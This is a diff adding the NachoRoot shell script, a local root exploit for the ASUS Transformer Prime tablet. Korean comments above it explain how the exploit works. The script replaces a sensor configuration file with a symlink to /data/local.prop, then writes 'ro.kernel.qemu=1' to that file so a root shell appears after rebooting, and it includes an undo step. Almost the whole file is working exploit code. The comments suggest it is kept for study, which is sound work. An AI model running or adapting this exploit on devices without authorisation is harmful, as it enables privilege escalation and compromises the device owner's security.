@@ -1,0 +1,43 @@
+# https://github.com/CunningLogic/NachoRoot
+
+# --stage1을 실행후 리부팅해서, --stage2를 실행하면 루트쉘을 획득하는 기능의 익스플로잇 쉘코드입니다.
+# /data/sensors/AMI304_Config.init을 백업하고
+# /data/local.prop(쓰이고 있는 속성)을 해당 파일로 위치시킵니다.
+# 리부팅 후, "ro.kernel.qemu=1"로 설정하는 속성을 /data/local.prop에 설정하고 리부팅하면 루트쉘이 뜹니다.
+# "ro.kernel.qemu=1"이 루트쉘을 뜨게 하는 기능이네요.
+# 쉘코드 분석 끝.
+
+#!/system/bin/sh
+echo "NachoRoot: ASUS Transformer Prime v1.2"
+echo "By Justin Case (jcase)"
+echo "Presented by TeamAndIRC, RootzWiki and AndroidPolice"
+echo "Testing by -viperboy-"
+echo "----------"
+echo "Much credit goes to Dan Rosenberg, without his Droid3 root, the idea behind this may not have came to light."
+echo "----------"
+echo "Usage ./nachoroot.bin <parameter>"
+echo "----------"
+echo "Parameters: DO NOT RUN OUT OF ORDER."
+echo "--stage1 : Reboots the Transformer"
+echo "--stage2 : Reboots the Transformer again, and gains root.."
+echo "--undo : This is your last step, after installing su/superuser, will fix instabilities from this root."
+echo "----------"
+  case $1 in
+   "--stage1")
+	echo "Please reboot then run again with --stage2 parameter."
+	mv /data/sensors/AMI304_Config.ini /data/sensors/AMI304_Config.ini.backup 2>&1 > /dev/null
+	ln -s /data/local.prop /data/sensors/AMI304_Config.ini 2>&1 > /dev/null
+	break;;
+   "--stage2")
+	echo "Please reboot again to gain root, run again with --undo after rebooting to cleanup."
+	echo "ro.kernel.qemu=1" > /data/local.prop 2>/dev/null
+	break;;
+   "--undo")
+	rm /data/sensors/AMI304_Config.ini 2>&1 > /dev/null
+	rm /data/local.prop  2>&1 > /dev/null
+	mv /data/sensors/AMI304_Config.ini.backup /data/sensors/AMI304_Config.ini 2>&1 > /dev/null
+	echo "Cleaning up the Nacho mess, please reboot..."
+	break;;
+   *)
+  esac
+
